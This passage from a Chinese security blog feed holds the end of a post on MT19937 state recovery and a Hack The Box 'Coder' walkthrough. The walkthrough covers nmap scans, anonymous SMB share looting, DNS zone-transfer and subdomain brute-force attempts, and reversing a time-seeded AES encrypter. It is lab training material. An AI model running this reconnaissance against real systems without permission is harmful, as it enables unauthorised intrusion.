class="number">624</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(S_ == S)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.randbytes(<span class="number">4</span>).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(random.randrange(<span class="number">1</span>, <span class="number">100000</span>))</span><br></pre></td></tr></table></figure><p>上述的假设建立在<strong>已知的 624 个连续输出要么是直接在种子初始化操作之后生成的，要么与其之间相隔了 624 的倍数个输出</strong></p><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250508194110.png" alt="微信截图_20250508194110"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MT19937 </tag>
            
            <tag> PRNG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Machine-Coder</title>
      <link href="/2025/04/27/HTB-Machine-Coder/"/>
      <url>/2025/04/27/HTB-Machine-Coder/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/04/27/HTB-Machine-Coder/Coder.png" alt="Coder"></p><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>先扫描所有开放端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 10.10.11.207 -oA nmapscan/ports</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49685/tcp open  unknown</span><br><span class="line">49700/tcp open  unknown</span><br></pre></td></tr></table></figure><blockquote><p>这里我又使用不加<code>-sT</code>命令进行了一次扫描</p><p><code>-sT</code> 扫描:</p><p>即TCP Connect扫描，<code>nmap</code>会尝试与目标主机的每个指定端口建立完整的 TCP 三次握手连接，<strong>如果连接成功，端口被认为是开放的；如果连接失败，端口被认为是关闭的或被过滤的</strong>，这种扫描方式不需要特殊权限，但更容易被检测到</p><p>不加<code>-sT</code>（默认 SYN 扫描，<code>-sS</code>）：</p><p>SYN扫描或半开放扫描，<code>nmap</code>发送一个 SYN 包到目标端口，如果收到 SYN/ACK 响应，则认为端口是开放的，然后 <code>nmap</code> 会发送一个 RST 包来终止连接，而不完成三次握手。这种方式速度快且隐秘，但需要管理员权限。</p><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;PORT      STATE SERVICE</span><br><span class="line">&gt;53/tcp    open  domain</span><br><span class="line">&gt;80/tcp    open  http</span><br><span class="line">&gt;88/tcp    open  kerberos-sec</span><br><span class="line">&gt;135/tcp   open  msrpc</span><br><span class="line">&gt;139/tcp   open  netbios-ssn</span><br><span class="line">&gt;389/tcp   open  ldap</span><br><span class="line">&gt;443/tcp   open  https</span><br><span class="line">&gt;445/tcp   open  microsoft-ds</span><br><span class="line">&gt;464/tcp   open  kpasswd5</span><br><span class="line">&gt;593/tcp   open  http-rpc-epmap</span><br><span class="line">&gt;636/tcp   open  ldapssl</span><br><span class="line">&gt;3268/tcp  open  globalcatLDAP</span><br><span class="line">&gt;3269/tcp  open  globalcatLDAPssl</span><br><span class="line">&gt;5985/tcp  open  wsman</span><br><span class="line">&gt;9389/tcp  open  adws</span><br><span class="line">&gt;47001/tcp open  winrm</span><br><span class="line">&gt;49664/tcp open  unknown</span><br><span class="line">&gt;49665/tcp open  unknown</span><br><span class="line">&gt;49666/tcp open  unknown</span><br><span class="line">&gt;49667/tcp open  unknown</span><br><span class="line">&gt;49669/tcp open  unknown</span><br><span class="line">&gt;49670/tcp open  unknown</span><br><span class="line">&gt;49671/tcp open  unknown</span><br><span class="line">&gt;49677/tcp open  unknown</span><br><span class="line">&gt;49680/tcp open  unknown</span><br><span class="line">&gt;49685/tcp open  unknown</span><br><span class="line">&gt;49700/tcp open  unknown</span><br><span class="line">&gt;49711/tcp open  unknown</span><br></pre></td></tr></table></figure><p>可见这种扫描更加的全面</p></blockquote><p>对所有开放端口进行更详细的扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p<span class="variable">$ports</span> 10.10.11.207 -oA nmapscan/detail   </span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-22 21:32:25Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">443/tcp   open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="line">| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US</span><br><span class="line">| Not valid before: 2022-11-04T17:25:43</span><br><span class="line">|_Not valid after:  2032-11-01T17:25:43</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:32+00:00; +7h30m22s from scanner time.</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49680/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49685/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49700/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows Server 2012 (92%), Windows Server 2019 (92%), Microsoft Windows Longhorn (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-03-22T21:33:24</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h30m21s, deviation: 0s, median: 7h30m21s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 83.14 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行udp端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 40 10.10.11.207 -oA nmapscan/udp</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE         SERVICE</span><br><span class="line">53/udp   open          domain</span><br><span class="line">123/udp  open          ntp</span><br><span class="line">137/udp  open|filtered netbios-ns</span><br><span class="line">138/udp  open|filtered netbios-dgm</span><br><span class="line">500/udp  open|filtered isakmp</span><br><span class="line">4500/udp open|filtered nat-t-ike</span><br><span class="line">5353/udp open|filtered zeroconf</span><br></pre></td></tr></table></figure><p>我们现在得到的信息有</p><ul><li>SMB 445</li><li>DNS 53</li><li>HTTP 80</li><li>HTTPS 443</li><li>Kerberos 88</li><li>LDAP 389</li><li>RPC 135</li><li>WinRM 5985</li></ul><p>容易得到这是一个域控</p><p>我们将上面得到的域名信息加入hosts文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.11.207 coder.htb dc01.coder.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="smb枚举"><a href="#smb枚举" class="headerlink" title="smb枚举"></a>smb枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.10.11.207 --shares</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250322221519.png" alt="微信截图_20250322221519"></p><p>我们从上面的枚举中看出，smb服务器启用了签名，同时启用了SMBv2协议，但是我们无法列出共享，接下来尝试使用匿名账户登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.10.11.207 -u chromos2me -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250322222044.png" alt="微信截图_20250322222044"></p><p>从上面可以看出匿名账户可以登录，同时我们有读<code>Development</code>，<code>IPC$</code>，<code>Users</code>共享的权限</p><h3 id="读取Development共享"><a href="#读取Development共享" class="headerlink" title="读取Development共享"></a>读取Development共享</h3><p>我们直接指定不需要密码进行共享连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N //10.10.11.207/Development </span><br></pre></td></tr></table></figure><p>我们发现存在两个共享文件夹</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323131320.png" alt="微信截图_20250323131320"></p><p>先查看<code>Migrations</code>共享文件夹</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323131558.png" alt="微信截图_20250323131558"></p><blockquote><p><code>adcs_reporting</code>：来自Github存储库PowerShell-AdminScripts的<a href="ActiveDirectoryCertificateServices/Get-ADCS_Report.ps1">ActiveDirectoryCertificateServices/Get-ADCS_Report.ps1</a></p><p><code>bootstrap-template-master</code>：来自Github存储库<a href="https://github.com/pro-dev-ph/bootstrap-responsive-web-application-template">bootstrap-responsive-web-application-template</a></p><p><code>Cachet-2.4</code>：来自存储库<a href="https://github.com/cachethq/cachet/tree/2.4">cachet</a></p><p><code>kimchi-master</code>：来自存储库<a href="https://github.com/kimchi-project/kimchi">kimchi</a></p></blockquote><p>只有<code>teamcity_test_repo</code>这个存储库看起来能被我们进行利用，我们将其保存到本地，需要递归下载整个文件夹需要开启下面的设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mask <span class="string">&quot;&quot;</span></span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br></pre></td></tr></table></figure><blockquote><p><code>mask &quot;&quot;</code>：用于设置上传文件的权限掩码，<code>&quot;&quot;</code>表示不应用任何权限掩码，通常会使用服务器默认的 <code>create mask</code> 或 <code>directory mask</code> 设置</p><p><code>recurse ON</code>：启用递归模式，即允许操作目录及其所有子目录中的文件，例如在 <code>mget</code>（批量下载）或 <code>mput</code>（批量上传）时，<code>recurse ON</code> 允许操作整个目录结构，而不仅仅是当前目录的文件</p><p><code>prompt OFF</code>：关闭交互式提示，避免 <code>smbclient</code> 在执行 <code>mget</code> 或 <code>mput</code> 这些命令时询问是否确认下载/上传每个文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mget \Migrations\teamcity_test_repo </span><br></pre></td></tr></table></figure><p>我们在.git文件夹下的config文件中发现一名用户信息<code>Sonya Blade</code>及其邮箱<code>s.blade@coder.htb</code></p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323140335.png" alt="微信截图_20250323140335"></p><p>读取Temporary Projects共享文件夹</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323140953.png" alt="微信截图_20250323140953"></p><p>我们发现了一个加密器和加密后的文件，仍然下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mget <span class="string">&quot;Temporary Projects&quot;</span></span><br></pre></td></tr></table></figure><p>这里我们需要对<code>Encrypter.exe</code>进行逆向，放到后面进行</p><h3 id="读取User共享"><a href="#读取User共享" class="headerlink" title="读取User共享"></a>读取User共享</h3><p>，没什么有用的东西</p><h2 id="DNS区域传送漏洞"><a href="#DNS区域传送漏洞" class="headerlink" title="DNS区域传送漏洞"></a>DNS区域传送漏洞</h2><p>我们现在获取到了域名<code>coder.htb</code>，我们向DNS服务器发起<code>AXFR</code>DNS 区域传输请求，看一下返回的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.11.207 coder.htb axfr</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323142619.png" alt="微信截图_20250323142619"></p><blockquote><p>Windows下可以利用下面的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;nslookup</span><br><span class="line">&gt;server &lt;dns-server&gt;</span><br><span class="line">&gt;<span class="built_in">set</span> <span class="built_in">type</span>=AXFR</span><br><span class="line">&gt;&lt;domain&gt;</span><br></pre></td></tr></table></figure></blockquote><p>现在区域传输失败了，我们尝试对子域进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum --dnsserver 10.10.11.207 -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt coder.htb</span><br></pre></td></tr></table></figure><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323211201.png" alt="微信截图_20250323211201"></p><p>对爆破出来的子域进行了手动测试，发现并没有什么有用的信息</p><h2 id="80-443端口"><a href="#80-443端口" class="headerlink" title="80/443端口"></a>80/443端口</h2><p>80端口仅仅是一个IIS的欢迎界面，没有什么其他的信息</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323211545.png" alt="微信截图_20250323211545"></p><p>443端口仍是欢迎界面，这样的话就可以先不进行目录爆破了，我们先对拿到的可执行文件进行逆向</p><h2 id="Encrypter-exe逆向"><a href="#Encrypter-exe逆向" class="headerlink" title="Encrypter.exe逆向"></a>Encrypter.exe逆向</h2><p>我们在dnspy中打开Encrypter.exe，发现如下图的程序主体逻辑</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323212613.png" alt="微信截图_20250323212613"></p><p>先分析Main函数</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AES</span></span><br><span class="line"><span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">bool</span> flag = args.Length != <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;You must provide the name of a file to encrypt.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">FileInfo fileInfo = <span class="keyword">new</span> FileInfo(args[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">string</span> destFile = Path.ChangeExtension(fileInfo.Name, <span class="string">&quot;.enc&quot;</span>);</span><br><span class="line"><span class="built_in">long</span> <span class="keyword">value</span> = DateTimeOffset.Now.ToUnixTimeSeconds();</span><br><span class="line">Random random = <span class="keyword">new</span> Random(Convert.ToInt32(<span class="keyword">value</span>));</span><br><span class="line"><span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">random.NextBytes(array);</span><br><span class="line"><span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">random.NextBytes(array2);</span><br><span class="line"><span class="built_in">byte</span>[] array3 = AES.EncryptFile(fileInfo.Name, destFile, array2, array);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序调用EncryptFile对文件进行AES加密，并给加密后的文件更改后缀为enc，但是这里的随机种子是<code>value</code>，它是通过<code>DateTimeOffset.Now.ToUnixTimeSeconds()</code>获取的，先获取当前的日期和时间并将其转换为 Unix 时间戳，那么这里的随机数就存在被我们预测的可能性。</p><p>接下来查看<code>EncryptFile</code>这个函数</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AES</span></span><br><span class="line"><span class="comment">// Token: 0x06000002 RID: 2 RVA: 0x000020E8 File Offset: 0x000002E8</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">EncryptFile</span>(<span class="params"><span class="built_in">string</span> sourceFile, <span class="built_in">string</span> destFile, <span class="built_in">byte</span>[] Key, <span class="built_in">byte</span>[] IV</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span> (RijndaelManaged rijndaelManaged = <span class="keyword">new</span> RijndaelManaged())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span> (FileStream fileStream = <span class="keyword">new</span> FileStream(destFile, FileMode.Create))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span> (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(Key, IV))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(fileStream, cryptoTransform, CryptoStreamMode.Write))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span> (FileStream fileStream2 = <span class="keyword">new</span> FileStream(sourceFile, FileMode.Open))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">int</span> count;</span><br><span class="line"><span class="keyword">while</span> ((count = fileStream2.Read(array, <span class="number">0</span>, array.Length)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cryptoStream.Write(array, <span class="number">0</span>, count);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数也就是实现文件加密的具体过程，其中传入的密钥和IV即我们上面所说的利用伪随机数生成的，如果我们能够知道文件创建的具体时间的话，我们就能恢复Unix时间戳然后预测随机数从而拿到密钥和IV，但是现在的问题是文件的创建时间是我们从共享中下载该文件的时间，要想保留真实的创建时间我们该怎么做呢？</p><p>我们应该将其挂载在我们的机器上，这里有多种挂载方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount //10.10.11.207/Development /mnt</span><br></pre></td></tr></table></figure><p>可以看到已经成功匿名挂载上去了</p><p><img src="/2025/04/27/HTB-Machine-Coder/微信截图_20250323222832.png" alt="微信截图_20250323222832"></p><p>接下来利用<code>stat</code>（<strong>命令用于显示文件或文件系统的详细信息，包括权限、大小、时间戳等</strong>）查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> /mnt/Temporary\ Projects/s.blade.enc </span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">──(chromosome㉿kali)-[~/HTB/Coder/Temporary Projects]</span><br><span class="line">└─$ <span class="built_in">stat</span> /mnt/Temporary\ Projects/s.blade.enc </span><br><span class="line">  文件：/mnt/Temporary Projects/s.blade.enc</span><br><span class="line">  大小：3808      块：8          IO 块大小：1048576 普通文件</span><br><span class="line">设备：0,54Inode: 1125899907128474  硬链接：1</span><br><span class="line">权限：(0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">访问时间：2022-11-12 06:17:08.374350100 +0800</span><br><span 